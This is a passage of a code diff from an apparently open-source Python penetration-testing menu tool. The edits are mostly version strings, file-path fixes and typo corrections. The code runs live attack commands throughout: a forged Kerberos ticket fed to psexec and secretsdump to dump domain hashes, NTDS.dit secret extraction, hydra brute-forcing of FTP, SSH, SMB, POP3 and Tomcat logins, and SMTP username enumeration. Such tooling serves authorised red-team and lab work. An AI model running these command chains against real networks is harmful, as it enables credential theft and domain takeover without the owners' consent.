+            
          if os.path.exists(USR.rstrip(" ") + ".ccache"):
+            print("[+] Exporting silver TGT to memory...")
+            command("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")
+            print("[*] Attempting to run psexec command...")
             command(keypath + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
-            command(keypath + "secretsdump.py -k " + DOM.rstrip(" ") + " -just-dc-ntlm -just-dc-user krbtgt")
+            print("[*] Attempting to run secretsdump command...")
+            command(keypath + "secretsdump.py -k -no-pass " + DOM.rstrip(" ") + "") # CAN ADD MORE OPTIONS
          else:
             print("[-] Golden TGT was not generated...")
       prompt()
@@ -2106,7 +2134,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - goldenpac.py -dc-ip IP -target-ip IP DOMAIN/USER:PASSWORD@DOMAIN
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2125,7 +2153,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - ldapdomaindump -u DOMAIN\USER:PASSWORD IP -o DIRECTORY.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2135,7 +2163,7 @@ while True:
 
       if checkParams != 1:
          if NTM[:5] != "EMPTY":
-            print("[i] Using HASH value as password credntial...")
+            print("[i] Using HASH value as password credential...")
             command("ldapdomaindump -u '" + DOM.rstrip(" ") + '\\' + USR.rstrip(" ") + "' -p :" + NTM.rstrip(" ") +" " + TIP.rstrip(" ") + " -o " + DIR.strip(" "))
          else:
             command("ldapdomaindump -u '" + DOM.rstrip(" ") + '\\' + USR.rstrip(" ") + "' -p '" + PAS.rstrip(" ") +"' " + TIP.rstrip(" ") + " -o " + DIR.strip(" "))
@@ -2147,7 +2175,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - Bloodhound-python -d DOMAIN -u USER -p PASSWORD
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2166,7 +2194,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - aclpwn - du neo4j password -f USER - d DOMAIN -sp PASSWORD -s IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2186,7 +2214,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - secretdump.py DOMAIN/USER:PASSWORD@IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2252,7 +2280,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - crackmapexec smb IP -u Administrator -p password --lusers --local-auth --shares & H hash -x 'net user Administrator /domain'
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2298,7 +2326,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - Remote Windows login using IMPERSONATE & NTM HASH - -service-name LUALL.exe"
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2314,7 +2342,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - domain/username:password@<targetName or address
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2330,7 +2358,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - Remote Windows login using IMPERSONATE & NTM HASH.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2346,14 +2374,12 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - NTDS CRACKER (EXPERIMENTAL)
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='59':     
-      checkParams = 0
-      
+   if selection =='59':           
       print("[*] Checking work folder for relevant files...")
 
       if os.path.exists("./" + DIR.rstrip(" ") + "/ntds.dit"):
@@ -2375,36 +2401,32 @@ while True:
          checkParams = 1       
          
       if checkParams != 1:
-         print("[*] Extracting secrets, please wait...")
+         print("[*] Extracting stored secrets, please wait...")
          command(keypath + "secretsdump.py -ntds ./" + DIR.rstrip(" ") + "/ntds.dit -system ./" + DIR.rstrip(" ") +  "/SYSTEM -security ./" + DIR.rstrip(" ") + "/SECURITY -hashes lmhash:nthash -pwd-last-set -history -user-status LOCAL -outputfile ./" + DIR.rstrip(" ") +  "/ntlm-extract > log.tmp")
       
-         print("[*] Imported extracted data...")
+         print("[*] Importing extracted secrets...")
          command("cut -f1 -d':' ./" + DIR.rstrip(" ") + "/ntlm-extract.ntds > DATAFILES/usernames.txt")
          command("cut -f4 -d':' ./" + DIR.rstrip(" ") + "/ntlm-extract.ntds > DATAFILES/hashes.txt")         
       
          with open("DATAFILES/usernames.txt", "r") as read1, open("DATAFILES/hashes.txt", "r") as read2:
            for x in range (0, maximum):
-               gotUser = read1.readline().rstrip("\n")
-               if gotUser != "":
-                  USER[x] = gotUser
-                  USER[x] = spacePadding(USER[x], COL3)            
+               USER[x] = read1.readline().rstrip("\n")
+               if USER[x] != "":
+                  USER[x] = spacePadding(USER[x], COL3)
                   
-               gotHash = read2.readline().rstrip("\n")
-               if gotHash != "":
-                  HASH[x] = gotHash
-                  if USER[x][:1] != " ":
-                     HASH[x] = spacePadding(HASH[x], COL4)
-                  else:
-                     HASH[x] = dotPadding(HASH[x], COL4)
+               HASH[x] = read2.readline().rstrip("\n")
+               if USER[x] != "":
+                  HASH[x] = spacePadding(HASH[x], COL4)
+               else:
+                  HASH[x] = dotPadding(HASH[x], COL4)
                VALD[x] = "0"
-         command("rm DATAFILES/tokens.txt")
-         command("touch DATAFILES/tokens.txt") 
+           resetTokens()
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - SSH GEN GENERATION
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2425,7 +2447,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - https://tools.kali.org/password-attacks/cewl
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2435,17 +2457,17 @@ while True:
    
       if checkParams != 1:
          if WEB[:1] != "":
-            command("cewl --depth 5 --min_word_length 3 --email --with-numbers --write usernames.txt " + WEB.rstrip(" ") + " 2>&1")
+            command("cewl --depth 5 --min_word_length 3 --email --with-numbers --write DATAFILES/usernames.txt " + WEB.rstrip(" ") + " 2>&1")
             print("[+] User list generated via website...")
          else:
-            command("cewl --depth 5 --min_word_length 3 --email --with-numbers --write usernames.txt " + TIP.rstrip(" ") + " 2>&1")
+            command("cewl --depth 5 --min_word_length 3 --email --with-numbers --write DATAFILES/usernames.txt " + TIP.rstrip(" ") + " 2>&1")
             print("[+] User list generated via ip address...")
 
          if os.path.exists("/usr/share/ncrack/minimal.usr"):
-            command("cat /usr/share/ncrack/minimal.usr >> usernames.txt 2>&1")
-            command("sed -i '/#/d' usernames.txt 2>&1")
-            command("sed -i '/Email addresses found/d' usernames.txt 2>&1")
-            command("sed -i '/---------------------/d' usernames.txt 2>&1")
+            command("cat /usr/share/ncrack/minimal.usr >> DATAFILES/usernames.txt 2>&1")
+            command("sed -i '/#/d' DATAFILES/usernames.txt 2>&1")
+            command("sed -i '/Email addresses found/d' DATAFILES/usernames.txt 2>&1")
+            command("sed -i '/---------------------/d' DATAFILES/usernames.txt 2>&1")
             print("[+] Adding NCrack minimal.usr list as well...")
 
          for x in range (0,maximum):
@@ -2456,7 +2478,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - https://tools.kali.org/password-attacks/cewl
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2483,8 +2505,8 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
-# Details : Menu option selected - Nano usernames.txt
+# Version : Al@N_3r@dL3y                                                             
+# Details : Menu option selected - Nano DATAFILES/usernames.txt
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -2499,7 +2521,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - Nano passwords.txt
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2515,7 +2537,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - Editor  hashes.txt
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2531,7 +2553,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - Editor hosts.conf
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2543,7 +2565,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - Mr Phiser is experimental!!
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2593,7 +2615,7 @@ while True:
             print("")
             
          print("[*] Checking for valid usernames...")
-         command("smtp-user-enum -U usernames.txt -d " + DOM.rstrip(" ") + " -m RCPT " + DOM.rstrip(" ") + " 25 | grep SUCC > valid1.tmp")                 
+         command("smtp-user-enum -U DATAFILES/usernames.txt -d " + DOM.rstrip(" ") + " -m RCPT " + DOM.rstrip(" ") + " 25 | grep SUCC > valid1.tmp")                 
          command("tr -cd '\11\12\15\40-\176' < valid1.tmp > valid.tmp")
          
          match = 0         
@@ -2635,7 +2657,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - GOBUSTER WEB ADDRESS/IP common.txt
 # Details : Alternative dictionary - /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 # Modified: N/A
@@ -2657,7 +2679,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - Nikto scan
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2680,7 +2702,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - HYDRA BRUTE FORCE FTP
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2708,7 +2730,7 @@ while True:
                command("echo password >> passwords.txt")
          
          if "21" in POR:
-            command("hydra -P passwords.txt -L usernames.txt ftp://" + TIP.rstrip(" "))
+            command("hydra -P passwords.txt -L DATAFILES/usernames.txt ftp://" + TIP.rstrip(" "))
          else:
             print("[-] FTP port not found in LIVE PORTS...")
          
@@ -2721,7 +2743,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - HYDRA BRUTE FORCE SSH
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2749,7 +2771,7 @@ while True:
                command("echo password >> passwords.txt")
          
          if "22" in POR:
-            command("hydra -P passwords.txt -L usernames.txt ssh://" + TIP.rstrip(" "))
+            command("hydra -P passwords.txt -L DATAFILES/usernames.txt ssh://" + TIP.rstrip(" "))
          else:
             print("[-] SSH port not found in LIVE PORTS...")
          
@@ -2762,7 +2784,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - HYDRA SMB BRUTEFORCE
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2790,7 +2812,7 @@ while True:
                command("echo password >> passwords.txt")
          
          if "445" in POR:
-            command("hydra -P passwords.txt -L usernames.txt smb://" + TIP.rstrip(" "))
+            command("hydra -P passwords.txt -L DATAFILES/usernames.txt smb://" + TIP.rstrip(" "))
          else:
             print("[-] SMB port not found in LIVE PORTS...")
          
@@ -2803,7 +2825,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - HYDRA POP3 BRUTEFORCE
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2831,10 +2853,10 @@ while True:
                command("echo password >> passwords.txt")
          
          if "110" in POR:
-            command("hydra -P passwords.txt -L usernames.txt " + TIP.rstrip(" ") + " POP3")
+            command("hydra -P passwords.txt -L DATAFILES/usernames.txt " + TIP.rstrip(" ") + " POP3")
          else:
             if "995" in POR:
-               command("hydra -P passwords.txt -L usernames.txt " + TIP.rstrip(" ") + " POP3s")
+               command("hydra -P passwords.txt -L DATAFILES/usernames.txt " + TIP.rstrip(" ") + " POP3s")
             else:
                print("[-] POP3 ports not found in LIVE PORTS...")
                
@@ -2847,7 +2869,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - TOMCAT WEB ADDRESS BRUTE FORCE
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2873,11 +2895,11 @@ while True:
             
          if "http://" in WEB.lower():
             target = WEB.replace("http://","")
-            command("hydra -L usernames.txt -P passwords.txt http-get://" + target.rstrip(" "))
+            command("hydra -L DATAFILES/usernames.txt -P passwords.txt http-get://" + target.rstrip(" "))
          
          if "https://" in WEB.lower():
             target = target.replace("https://","")
-            command("hydra -L usernames.txt -P passwords.txt https-get://" + target.rstrip(" "))
+            command("hydra -L DATAFILES/usernames.txt -P passwords.txt https-get://" + target.rstrip(" "))
                           
          for x in range (0,maximum):
             USER[x] = linecache.getline("DATAFILES/usernames.txt", x + 1).rstrip(" ")
@@ -2888,7 +2910,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - MSFCONSOLE TOMCAT CLASSIC EXPLOIT
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2921,7 +2943,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - rsync -av rsync://IP:873/SHARENAME SHARENAME
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2939,7 +2961,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - rsync -a rsync://IP:873
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2957,7 +2979,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - rdesktop - u user -p password -d domain / IP port num?
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2972,7 +2994,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - Xfreeredp port number ?
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2987,7 +3009,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - FTP PORT 21
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -3002,7 +3024,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - ssh -l USER IP -p PORT 22
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -3017,7 +3039,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - ssh -i id USER@IP -p 22
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -3032,7 +3054,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - telnet -l USER IP PORT 23
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -3047,7 +3069,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - nc IP PORT 80.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -3062,7 +3084,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - sqsh -H IP -L user=USER -L password=PASSWORD + exec xp_cmdshell 'whoami'; go PORT 1433
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -3077,7 +3099,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - MSSQLCLIENT PORT 1433
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -3094,7 +3116,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - MYSQL Login using port 3306
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -3109,7 +3131,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - WINRM remote login using PORT 5985
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -3128,7 +3150,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : @g3nT_0r@nG3                                                              
+# Version : Al@N_3r@dL3y                                                             
 # Details : Menu option selected - Save config to DATAFILES/config.txt and exit program
 # Modified: N/A
 # Status  : Streamlined
